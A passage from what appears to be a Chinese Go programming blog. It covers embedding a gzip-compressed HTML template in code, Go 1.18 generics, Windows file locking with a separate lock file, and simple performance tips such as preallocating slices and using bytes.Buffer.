<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">fw, err := os.Create(<span class="string">&quot;demo.gzip&quot;</span>) <span class="comment">// 创建gzip包文件，返回*io.Writer</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fw.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实例化心得gzip.Writer</span></span><br><span class="line">gw, _ := gzip.NewWriterLevel(fw, <span class="number">9</span>)</span><br><span class="line"><span class="keyword">defer</span> gw.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取要打包的文件信息</span></span><br><span class="line">fr, err := os.Open(<span class="string">&quot;1122.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fr.Close()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取文件头信息</span></span><br><span class="line">fi, err := fr.Stat()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建gzip.Header</span></span><br><span class="line">gw.Header.Name = fi.Name()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取文件数据</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="type">byte</span>, fi.Size())</span><br><span class="line">_, err = fr.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入数据到zip包</span></span><br><span class="line">_, err = gw.Write(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 读取gzip文件输出成string</span></span><br><span class="line">f, _ := ioutil.ReadFile(<span class="string">&quot;demo.gzip&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _, b := <span class="keyword">range</span> f &#123;</span><br><span class="line">    fmt.Print(<span class="type">int</span>(b), <span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将上面的gzip以int的string形式存储到代码里，如下</p>
<p><img src="/2022/05/03/study-golang-record-3/clipboard.png" alt="生成的string"></p>
<p>解压代码：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">buff := []<span class="type">byte</span>&#123;&#125;</span><br><span class="line">temp := strings.Split(zipData, <span class="string">&quot;,&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> _, b := <span class="keyword">range</span> temp &#123;</span><br><span class="line">    i, _ := strconv.Atoi(b)</span><br><span class="line">    buff = <span class="built_in">append</span>(buff, <span class="type">byte</span>(i))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// w.htmlFile为文件名称</span></span><br><span class="line">w.htmlOutputFile, err = os.Create(w.htmlFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    util.Error(fmt.Sprintf(<span class="string">&quot;could not create %s. please check&quot;</span>, w.htmlFile))</span><br><span class="line">    w.htmlFile = <span class="string">&quot;&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    gr, err := gzip.NewReader(bytes.NewReader(buff)))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        util.Error(<span class="string">&quot;could not decompress html templete zipData&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> gr.Close()</span><br><span class="line">    buff := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">1024</span>*<span class="number">1024</span>*<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        n, _ := gr.Read(buff)</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span> &#123;</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        _, err = w.htmlOutputFile.Write(buff[:n])</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            util.Error(fmt.Sprintf(<span class="string">&quot;could not write basic html into %s. please check&quot;</span>, w.htmlFile))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cpu和内存没有爆炸O(∩_∩)O</p>
<p>ps：gzip有默认的最大读取长度，最长读取32768，当单个文件大小过大时，需要循环读取</p>
<h2 id="13、golang-1-18—泛型"><a href="#13、golang-1-18—泛型" class="headerlink" title="13、golang 1.18—泛型"></a>13、golang 1.18—泛型</h2><p>golang 在不久之前更新了1.18版本，支持了新特性： 泛型(Generics)，详细介绍见官方参考文档：<a target="_blank" rel="noopener" href="https://go.dev/doc/tutorial/generics">https://go.dev/doc/tutorial/generics</a></p>
<p>这里只进行简单记录</p>
<p>在golang语法中，需要对每个函数参数的类型进行定义，而且只能定义一种类型，比如float，int中的一种，如果参数可能为float或int，则需要针对这两种类型写两个函数，如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 针对value为int类型写的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SumInts</span><span class="params">(m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int64</span>)</span></span> <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s <span class="type">int64</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">		s += v</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 针对value为float类型写的函数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SumFloats</span><span class="params">(m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">float64</span>)</span></span> <span class="type">float64</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> s <span class="type">float64</span></span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">		s += v</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	ints := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int64</span>&#123;</span><br><span class="line">		<span class="string">&quot;first&quot;</span>:  <span class="number">34</span>,</span><br><span class="line">		<span class="string">&quot;second&quot;</span>: <span class="number">12</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 初始化</span></span><br><span class="line">	floats := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">float64</span>&#123;</span><br><span class="line">		<span class="string">&quot;first&quot;</span>:  <span class="number">35.98</span>,</span><br><span class="line">		<span class="string">&quot;second&quot;</span>: <span class="number">26.99</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 调用函数</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Non-Generic Sums: %v and %v\n&quot;</span>,</span><br><span class="line">		SumInts(ints),</span><br><span class="line">		SumFloats(floats))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用1.18版本中新定义的泛型，则可以只定义一个泛型函数，在调用时统一调用这个泛型函数即可</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// value可以为int64或是float64类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SumIntsOrFloats</span>[<span class="title">K</span> <span class="title">comparable</span>, <span class="title">V</span> <span class="title">int64</span> | <span class="title">float64</span>]<span class="params">(m <span class="keyword">map</span>[K]V)</span></span> V &#123;</span><br><span class="line">	<span class="keyword">var</span> s V</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> m &#123;</span><br><span class="line">		s += v</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// Initialize a map for the integer values</span></span><br><span class="line">	ints := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int64</span>&#123;</span><br><span class="line">		<span class="string">&quot;first&quot;</span>:  <span class="number">34</span>,</span><br><span class="line">		<span class="string">&quot;second&quot;</span>: <span class="number">12</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Initialize a map for the float values</span></span><br><span class="line">	floats := <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">float64</span>&#123;</span><br><span class="line">		<span class="string">&quot;first&quot;</span>:  <span class="number">35.98</span>,</span><br><span class="line">		<span class="string">&quot;second&quot;</span>: <span class="number">26.99</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	fmt.Printf(<span class="string">&quot;Generic Sums: %v and %v\n&quot;</span>,</span><br><span class="line">		SumIntsOrFloats[<span class="type">string</span>, <span class="type">int64</span>](ints),</span><br><span class="line">		SumIntsOrFloats[<span class="type">string</span>, <span class="type">float64</span>](floats))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>SumIntsOrFloats</code>函数在函数名称后边的紧跟一个中括号<code>[K comparable, V int64 | float64]</code>的定义了两个泛型参数K和V, 表示将在函数定义中使用这两个泛型参数。 在中括号中同时为泛型参数K和V指定了类型约束:</p>
<ul>
<li>为泛型参数K指定的类型约束是<code>comparable</code>，comparable是Go语言内置的类型约束，它表示类型的值可以使用<code>==</code>和<code>!=</code>比较大小，这也是map类型的key要求的。</li>
<li>为泛型参数V指定的类型约束是int64和float64两种类型的联合，<code>|</code>表示允许两者中的任何一个</li>
</ul>
<p>后边在函数的参数列表中将m参数的类型指定为<code>map[K]V</code>，因为在声明泛型参数时，已经为其指定了约束，例如<code>K</code>是<code>comparable</code>的，这样<code>map[K]V</code>才是一个有效的map类型，如果没有指定这个约束，编译器会报编译错误</p>
<p>（ps：我暂时还没用过这个特性。。个人感觉这个特性可能以后会给二进制程序带来漏洞。。）</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%BC%80%E5%8F%91/" rel="tag">开发</a></li></ul>

    </footer>
  </div>

   
    
</article>

    
    <article
  id="post-study-golang-record-2"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/18/study-golang-record-2/"
    >Golang学习记录之二</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/18/study-golang-record-2/" class="article-date">
  <time datetime="2022-04-18T06:38:41.000Z" itemprop="datePublished">2022-04-18</time>
</a>    
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>​    基于上一篇文章的补充，后续若遇到其他坑或者有新的小技巧会继续补充的哈(。・∀・)ノ</p>
<h2 id="1、函数的返回值可以是一个函数"><a href="#1、函数的返回值可以是一个函数" class="headerlink" title="1、函数的返回值可以是一个函数"></a>1、函数的返回值可以是一个函数</h2><p>在golang中，需要对每个函数定义好返回值的类型（如果有返回值的话），其中返回值的类型可以是一个函数类型</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">SprintFunc</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">(a ...&#123;&#125;)</span></span> <span class="type">string</span> &#123;     <span class="comment">// 将func(a ...&#123;&#125;) string作为函数返回类型</span></span><br><span class="line">	<span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(a ...<span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> fmt.Sprint(a...)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	b := SprintFunc()                       <span class="comment">// 这里变量b的类型为func(a ...&#123;&#125;) string，是一个函数类型</span></span><br><span class="line">	fmt.Println(b(<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>))              <span class="comment">// 调用函数b</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="2、windows文件锁"><a href="#2、windows文件锁" class="headerlink" title="2、windows文件锁"></a>2、windows文件锁</h2><p>在很多场景下，会遇到多个协程同时写文件的操作，需要用到文件锁以保证写入顺序</p>
<p>golang的syscall库内置了设置文件锁函数Flock，其函数原理是调用系统的flock这个api，但只能在linux平台内使用，windows上没有flock这个api</p>
<p>在github上搜索第三方库，发现1个库：github.com&#x2F;gofrs&#x2F;flock（其余还有很多其他的库，如github.com&#x2F;zbiljic&#x2F;go-filelock， github.com&#x2F;juju&#x2F;fslock ，都大同小异）</p>
<p>但使用方式与linux的略有不同，linux文件锁的参数是打开的文件句柄，代码如下所示：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">f, err := os.OpenFile(file, os.O_WRONLY|os.O_APPEND, <span class="number">0666</span>)</span><br><span class="line">syscall.Flock(<span class="type">int</span>(f.Fd()), syscall.LOCK_EX)  <span class="comment">// 文件上锁</span></span><br><span class="line">_, _ = io.WriteString(f, <span class="string">&quot;123\n&quot;</span>)            <span class="comment">// 文件写入</span></span><br><span class="line">syscall.Flock(<span class="type">int</span>(f.Fd()), syscall.LOCK_UN)  <span class="comment">// 文件解锁</span></span><br></pre></td></tr></table></figure>

<p>文件上锁之后，仍然可以对该文件句柄进行写入操作，只是其他协程再尝试上锁会被阻塞（句柄不同）</p>
<p>但上面那个github.com&#x2F;gofrs&#x2F;flock   在windows平台上的参数是文件路径</p>
<p>如果先上锁再进行文件写入操作，则会返回写入失败（写入文件前都会先给文件上锁的吧。。）</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(file <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	</span><br><span class="line">	lock := fslock.New(file)</span><br><span class="line">	lockErr := lock.Lock()     <span class="comment">// 文件上锁</span></span><br><span class="line">	<span class="keyword">if</span> lockErr != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(lockErr)</span><br><span class="line">	&#125;</span><br><span class="line">	f, err := os.OpenFile(file, os.O_WRONLY|os.O_APPEND, <span class="number">0666</span>)</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open err: &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	_, _ = io.WriteString(f, <span class="string">&quot;123\n&quot;</span>)   <span class="comment">// 会返回写入失败</span></span><br><span class="line">	lock.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	write(<span class="string">&quot;123.txt&quot;</span>)</span><br><span class="line">	write(<span class="string">&quot;123.txt&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">The process cannot access the file because it is being used by another process.</span><br></pre></td></tr></table></figure>

<p>windows上文件锁具体如何配合写文件，这些github上都没写（这一点好坑，害得我研究了几天）</p>
<p>某一天突然灵光一闪，想到了如何使用，那就是创建另外一个文件当作文件锁，在获取到文件锁之后再写到输出文件里，示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gofrs/flock&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/remeh/sizedwaitgroup&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(file <span class="type">string</span>, wgscan *sizedwaitgroup.SizedWaitGroup)</span></span> &#123;</span><br><span class="line">	<span class="keyword">defer</span> wgscan.Done()</span><br><span class="line">	fmt.Println(file)</span><br><span class="line">	f, err := os.OpenFile(file, os.O_WRONLY|os.O_APPEND, <span class="number">0666</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open err: &quot;</span>, err.Error())</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;try to write 123&quot;</span>)</span><br><span class="line">	fileLock := flock.New(<span class="string">&quot;temp/outputFile.pid&quot;</span>)      <span class="comment">// 创建另一个文件outputFile.pid当做文件锁，</span></span><br><span class="line">                                                      <span class="comment">// 对该文件上锁，如果能够上锁，则认为当前没有协程对123.txt进行写操作，则可以放心写入</span></span><br><span class="line">	<span class="keyword">for</span> &#123;                                             <span class="comment">// TryLock会尝试获取文件锁，但获取失败时不会堵塞，所以这里需要使用循环来不断尝试获取</span></span><br><span class="line">		locked, err := fileLock.TryLock()</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			util.Error(<span class="string">&quot;output file lock failed: &quot;</span>, err.Error(), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> locked &#123;                                   <span class="comment">// 如果成功获取到文件锁，则退出循环</span></span><br><span class="line">			<span class="keyword">defer</span> fileLock.Unlock()                   <span class="comment">// 函数退出时会解锁</span></span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;write 123&quot;</span>)</span><br><span class="line">	_, err2 := io.WriteString(f, <span class="string">&quot;123\n&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err2 != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;write:&quot;</span>, err2)</span><br><span class="line">	&#125;</span><br><span class="line">	f.Close()</span><br><span class="line">	fmt.Println(<span class="string">&quot;write 123 done&quot;</span>)</span><br><span class="line">	time.Sleep(<span class="number">3</span> * time.Second)</span><br><span class="line">	fmt.Println(<span class="string">&quot;quit write&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	wgscan := sizedwaitgroup.New(<span class="number">2</span>)                   <span class="comment">// 创建两个协程</span></span><br><span class="line">	pwd, _ := os.Getwd()</span><br><span class="line">	wgscan.Add()</span><br><span class="line">	<span class="keyword">go</span> write(filepath.Join(pwd,<span class="string">&quot;123.txt&quot;</span>), &amp;wgscan)   <span class="comment">// 往123.txt里写文件</span></span><br><span class="line">	wgscan.Add()</span><br><span class="line">	<span class="keyword">go</span> write(filepath.Join(pwd,<span class="string">&quot;123.txt&quot;</span>), &amp;wgscan)</span><br><span class="line">	wgscan.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="3、性能提升"><a href="#3、性能提升" class="headerlink" title="3、性能提升"></a>3、性能提升</h2><p>当开发一些比较大的程序时，性能提升就显得比较重要了（否则运行慢导致没人用&#x2F;(ㄒoㄒ)&#x2F;~~）</p>
<p>下面是一些提升的心得：</p>
<p><strong>1）用到比较大的结构体作为函数返回值&#x2F;参数时，使用指针形式（否则会拷贝一份到内存中，徒增消耗）</strong></p>
<p><strong>2）在构造字符串时，对于拼接比较多的情况，比如</strong></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b,c,d,e,f,g <span class="type">string</span></span><br><span class="line">output := a+b+c+d+e+f+g   <span class="comment">// 字符串拼接操作</span></span><br><span class="line">fmt.Println(output)</span><br></pre></td></tr></table></figure>

<p>这种拼接构造字符串效率其实是比较低的，使用专门的构造字符串的结构<code>bytes.Buffer</code>，效率会更高</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b,c,d,e,f,g <span class="type">string</span></span><br><span class="line">output := <span class="built_in">new</span>(bytes.Buffer)</span><br><span class="line">buff.WriteString(a)</span><br><span class="line">buff.WriteString(b)</span><br><span class="line">buff.WriteString(c)</span><br><span class="line">buff.WriteString(d)</span><br><span class="line">buff.WriteString(e)</span><br><span class="line">buff.WriteString(f)</span><br><span class="line">buff.WriteString(g)</span><br><span class="line">fmt.Println(buff.String())</span><br></pre></td></tr></table></figure>

<p><strong>3）使用预分配</strong></p>
<p>因为golang中切片是不定长的，可以使用append函数将数据插入到切片中，但其实插入到切片之前，golang会先检查切片的长度是否达到了容量上限，如果达到了上限，是需要先申请内存，对切片进行扩容操作，再进行数据插入</p>
<p>如果已经知道切片长度，则使用make函数提前一次性申请内存空间，再进行赋值操作效率会更高</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n := <span class="number">10</span></span><br><span class="line">src := <span class="built_in">make</span>([]<span class="type">int</span>, n)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 无预分配: 162 ns/op</span></span><br><span class="line"><span class="keyword">var</span> dst []<span class="type">int</span></span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;n; i++ &#123;</span><br><span class="line">	dst = <span class="built_in">append</span>(dst, src[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 预分配，32.3 ns/op，提升了5倍</span></span><br><span class="line">dst2 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">0</span>, n)</span><br><span class="line"><span class="keyword">for</span> i:=<span class="number">0</span>; i&lt;n; i++ &#123;</span><br><span class="line">	dst2 = <span class="built_in">append</span>(dst2, src[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：</p>
<p><a target="_blank" rel="noopener" href="https://wudaijun.com/2019/09/go-performance-optimization/">https://wudaijun.com/2019/09/go-performance-optimization/</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1165922">https://cloud.tencent.com/developer/article/1165922</a></p>
